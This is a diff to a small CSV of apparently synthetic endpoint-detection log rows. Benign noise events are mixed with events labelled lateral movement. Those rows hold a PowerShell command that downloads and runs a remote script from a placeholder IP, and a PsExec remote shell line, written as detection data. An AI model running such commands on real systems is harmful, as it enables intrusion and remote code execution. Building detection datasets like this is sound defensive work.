@@ -1,5 +1,7 @@
 _time,index,host,user,process,parent_process,cmdline,signal,severity,action,scenario
+2026-05-31T00:21:40Z,edr,PATCH-01,svc_patch,wuauclt.exe,svchost.exe,wuauclt.exe /detectnow /updatenow,,info,allowed,benign-noise
+2026-05-31T00:46:00Z,edr,SCAN-02,svc_vuln,nessusd.exe,services.exe,nessusd.exe --scan creds=svc_vuln,,info,allowed,benign-noise
 2026-05-31T01:00:05Z,edr,WKS-201,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default,,info,allowed,benign-noise
-2026-05-31T01:33:20Z,edr,BKP-09,svc_monitor,robocopy.exe,backup_agent.exe,robocopy \\FS-01\C$\logs D:\archive /MIR,,info,allowed,benign-noise
+2026-05-31T01:33:20Z,edr,MON-03,svc_monitor,robocopy.exe,backup_agent.exe,robocopy \\FS-01\C$\logs D:\archive /MIR,,info,allowed,benign-noise
 2026-05-31T02:08:12Z,edr,WKS-014,jdoe,powershell.exe,explorer.exe,powershell -enc <b64> IEX(New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1'),suspicious_download,high,detected,lateral-movement
 2026-05-31T02:10:55Z,edr,WKS-014,svc_backup,PsExec.exe,cmd.exe,PsExec.exe \\FS-01 -u svc_backup cmd,remote_exec_tool,high,detected,lateral-movement
